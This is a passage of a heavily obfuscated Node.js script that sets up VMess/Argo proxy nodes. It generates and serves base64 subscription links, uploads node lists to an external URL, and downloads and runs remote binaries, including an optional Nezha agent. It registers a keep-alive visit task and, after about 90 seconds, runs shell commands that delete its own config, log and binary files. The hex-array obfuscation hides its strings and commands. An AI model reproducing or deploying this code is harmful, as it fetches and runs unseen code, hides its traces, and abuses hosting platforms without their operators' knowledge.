axios[_0x1fe42a(_0x4194af._0x1a2b8f)](_0x1fe42a(0x189),{'timeout':0xbb8});if(_0x47c17e['data']&&_0x47c17e[_0x1fe42a(0x15c)][_0x1fe42a(_0x4194af._0x468fa2)]===_0x1fe42a(_0x4194af._0x3a9304)&&_0x47c17e[_0x1fe42a(0x15c)][_0x1fe42a(0x165)]&&_0x47c17e['data'][_0x1fe42a(_0x4194af._0x30c085)])return _0x47c17e[_0x1fe42a(0x15c)]['countryCode']+'_'+_0x47c17e['data'][_0x1fe42a(_0x4194af._0x30c085)];}catch(_0x29e52a){}}return _0x1fe42a(_0x4194af._0x47ad99);}async function _0x5b3f52(_0x39c6f0){const _0x44d023=await _0x24fdd4(),_0x19da82=NAME?NAME+'-'+_0x44d023:_0x44d023;return new Promise(_0x53787e=>{const _0x3c124f={_0x44c81f:0x1c3,_0x4554a4:0x1ac,_0x5d102b:0x1a7,_0x2a228c:0x153,_0x33c7d0:0x13c,_0xbaae8e:0x19a,_0xc6a34d:0x170,_0x699491:0x13b,_0x1fa74f:0x170,_0x5a8753:0x130};setTimeout(()=>{const _0x208513={_0x4eda8d:0x1c9,_0x36a828:0x153},_0x95585c=_0x1968,_0x540828={'v':'2','ps':''+_0x19da82,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x95585c(0x1c3),'net':'ws','type':_0x95585c(_0x3c124f._0x44c81f),'host':_0x39c6f0,'path':'/vmess-argo?ed=2560','tls':_0x95585c(0x1cf),'sni':_0x39c6f0,'alpn':'','fp':'firefox'},_0x2e0bf2=_0x95585c(0x18f)+UUID+'@'+CFIP+':'+CFPORT+_0x95585c(_0x3c124f._0x4554a4)+_0x39c6f0+_0x95585c(0x13c)+_0x39c6f0+_0x95585c(_0x3c124f._0x5d102b)+_0x19da82+_0x95585c(0x163)+Buffer[_0x95585c(0x170)](JSON[_0x95585c(0x174)](_0x540828))['toString'](_0x95585c(_0x3c124f._0x2a228c))+_0x95585c(0x172)+UUID+'@'+CFIP+':'+CFPORT+_0x95585c(0x17e)+_0x39c6f0+_0x95585c(_0x3c124f._0x33c7d0)+_0x39c6f0+_0x95585c(0x13e)+_0x19da82+_0x95585c(_0x3c124f._0xbaae8e);console[_0x95585c(0x152)](Buffer[_0x95585c(_0x3c124f._0xc6a34d)](_0x2e0bf2)['toString']('base64')),fs[_0x95585c(_0x3c124f._0x699491)](subPath,Buffer[_0x95585c(_0x3c124f._0x1fa74f)](_0x2e0bf2)[_0x95585c(0x1c9)](_0x95585c(0x153))),console['log'](FILE_PATH+_0x95585c(_0x3c124f._0x5a8753)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x77baf6,_0x2aef91)=>{const _0x5a2fc2=_0x95585c,_0xcd264a=Buffer['from'](_0x2e0bf2)[_0x5a2fc2(_0x208513._0x4eda8d)](_0x5a2fc2(_0x208513._0x36a828));_0x2aef91['set'](_0x5a2fc2(0x1ca),'text/plain;\x20charset=utf-8'),_0x2aef91[_0x5a2fc2(0x139)](_0xcd264a);}),_0x53787e(_0x2e0bf2);},0x7d0);});}}async function uploadNodes(){const _0x2ddb0f={_0xb70163:0x152,_0x474f3d:0x119,_0x11b33e:0x17c,_0x1db2e5:0x133,_0x4d553c:0x1c5,_0x9848f4:0x18d},_0x4d22da=_0x4b92de;if(UPLOAD_URL&&PROJECT_URL){const _0x5e5dee=PROJECT_URL+'/'+SUB_PATH,_0x3dbfa9={'subscription':[_0x5e5dee]};try{const _0x466f37=await axios['post'](UPLOAD_URL+_0x4d22da(0x132),_0x3dbfa9,{'headers':{'Content-Type':'application/json'}});return _0x466f37&&_0x466f37[_0x4d22da(0x133)]===0xc8?(console[_0x4d22da(_0x2ddb0f._0xb70163)](_0x4d22da(_0x2ddb0f._0x474f3d)),_0x466f37):null;}catch(_0x3610ec){if(_0x3610ec[_0x4d22da(_0x2ddb0f._0x11b33e)]){if(_0x3610ec[_0x4d22da(0x17c)][_0x4d22da(_0x2ddb0f._0x1db2e5)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4d22da(0x195)](listPath))return;const _0x144d96=fs[_0x4d22da(_0x2ddb0f._0x4d553c)](listPath,_0x4d22da(0x15e)),_0x53d0ba=_0x144d96['split']('\x0a')['filter'](_0x3f0a47=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4d22da(0x162)](_0x3f0a47));if(_0x53d0ba[_0x4d22da(_0x2ddb0f._0x9848f4)]===0x0)return;const _0x4d6128=JSON['stringify']({'nodes':_0x53d0ba});try{const _0x21f5d3=await axios['post'](UPLOAD_URL+_0x4d22da(0x188),_0x4d6128,{'headers':{'Content-Type':_0x4d22da(0x187)}});return _0x21f5d3&&_0x21f5d3[_0x4d22da(0x133)]===0xc8?(console[_0x4d22da(0x152)]('Nodes\x20uploaded\x20successfully'),_0x21f5d3):null;}catch(_0x495591){return null;}}else return;}}function cleanFiles(){const _0x805fd3={_0x8e272a:0x169,_0x4888eb:0x121,_0xa66347:0x180},_0x3674b4={_0x3fd31b:0x1b6};setTimeout(()=>{const _0x18d302={_0x4c8697:0x152},_0x349fb2=_0x1968,_0x18ea66=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x18ea66[_0x349fb2(0x16d)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x18ea66[_0x349fb2(0x16d)](phpPath);process[_0x349fb2(_0x805fd3._0x8e272a)]==='win32'?exec(_0x349fb2(0x15f)+_0x18ea66[_0x349fb2(_0x805fd3._0x4888eb)]('\x20')+_0x349fb2(0x175),_0xbfffca=>{const _0x25df57=_0x349fb2;console[_0x25df57(0x1b6)](),console[_0x25df57(_0x18d302._0x4c8697)](_0x25df57(0x1a9)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x349fb2(_0x805fd3._0xa66347)+_0x18ea66[_0x349fb2(0x121)]('\x20')+_0x349fb2(0x14b),_0x3ba1fd=>{const _0x3687be=_0x349fb2;console[_0x3687be(_0x3674b4._0x3fd31b)](),console['log'](_0x3687be(0x1a9)),console['log'](_0x3687be(0x146));});},0x15f90);}cleanFiles();function _0x1968(_0x5e6ea1,_0x1c4691){const _0x2a9be3=_0x2a9b();return _0x1968=function(_0x1968e7,_0x514cb6){_0x1968e7=_0x1968e7-0x116;let _0xcb6088=_0x2a9be3[_0x1968e7];return _0xcb6088;},_0x1968(_0x5e6ea1,_0x1c4691);}async function AddVisitTask(){const _0x1cb7cb={_0x2c9b0a:0x152,_0x3bd461:0x161,_0x5587fd:0x187,_0x4e7748:0x11e,_0x4be26f:0x11c},_0x165907=_0x4b92de;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x165907(_0x1cb7cb._0x2c9b0a)](_0x165907(0x171));return;}try{const _0x4f4ce0=await axios[_0x165907(_0x1cb7cb._0x3bd461)](_0x165907(0x1b1),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x165907(_0x1cb7cb._0x5587fd)}});return console['log']('automatic\x20access\x20task\x20added\x20successfully'),_0x4f4ce0;}catch(_0x417840){return console['error'](_0x165907(_0x1cb7cb._0x4e7748)+_0x417840[_0x165907(_0x1cb7cb._0x4be26f)]),null;}}async function startserver(){const _0xd45407={_0xa18b01:0x142},_0x5468d4=_0x4b92de;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x39f4dc){console[_0x5468d4(_0xd45407._0xa18b01)]('Error\x20in\x20startserver:',_0x39f4dc);}}startserver()[_0x4b92de(0x1b2)](_0x1548e3=>{const _0x5df7d3={_0x1cf6e8:0x142,_0x3b8e8f:0x15b},_0x4fcee8=_0x4b92de;console[_0x4fcee8(_0x5df7d3._0x1cf6e8)](_0x4fcee8(_0x5df7d3._0x3b8e8f),_0x1548e3);}),app[_0x4b92de(0x1be)](PORT,()=>console['log'](_0x4b92de(0x1d1)+PORT+'!'));
